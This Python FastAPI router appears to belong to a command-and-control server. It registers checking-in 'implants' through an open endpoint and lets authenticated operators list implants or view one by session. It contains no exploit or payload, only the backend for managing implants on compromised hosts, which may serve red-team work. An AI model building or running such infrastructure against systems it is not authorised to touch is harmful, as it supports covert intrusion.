import base64
import binascii
from datetime import datetime, timezone
from fastapi import APIRouter, FastAPI, HTTPException, status, Depends, Security
from fastapi.responses import RedirectResponse
from fastapi.security import OAuth2PasswordBearer
from jose import JWTError, jwt
from typing import Optional, List

# CORRECT imports when you're inside the 'server' package
from server_helper.user_helper import Users, UserRead, UserCreate, UserDelete
from server_helper.auth_helper import oauth2_scheme, verify_token
from server_helper.db import get_db, SessionLocal

from server_helper.implant_helper import Implant, ImplantCreate, ImplantRead
from server_helper.tasking_helper import (
    Tasking,
    TaskingCreate,
    TaskingRead,
    TaskingDelete,
)
from server_helper.results_helper import (
    Results,
    ResultsCreate,
    ResultsRead,
    ResultsDelete,
)

router = APIRouter(prefix="/implants", tags=["implants"])

# endpoint for agent initial checkin, register with server for future tasking/results/tracking
@router.post("/", response_model=ImplantRead)
def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)):  # type: ignore
    current_time = datetime.now(timezone.utc).isoformat()

    implant_data = implant.model_dump(
        exclude={"alive", "first_checkin", "last_checkin"}
    )
    db_implant = Implant(
        **implant_data,
        alive=True,
        first_checkin=current_time,
        last_checkin=current_time,
    )

    db.add(db_implant)
    db.commit()
    db.refresh(db_implant)
    return db_implant


# PROTECTED endpoint for clients only to be able to view all implants
@router.get("/", response_model=List[ImplantRead])
def read_implants(
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    verify_token(token)
    implants = db.query(Implant).all()
    return implants


# PROTECTED endpoint for clients to be able to view a single implant by session
@router.get("/{session}", response_model=ImplantRead)
def read_single_implant(
    session: str,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    verify_token(token)
    implant = db.query(Implant).filter(Implant.session == session).first()
    if implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    # check if alive
    if not implant.alive:
        raise HTTPException(
            status_code=410, detail="Implant is dead or has been killed"
        )
    return implant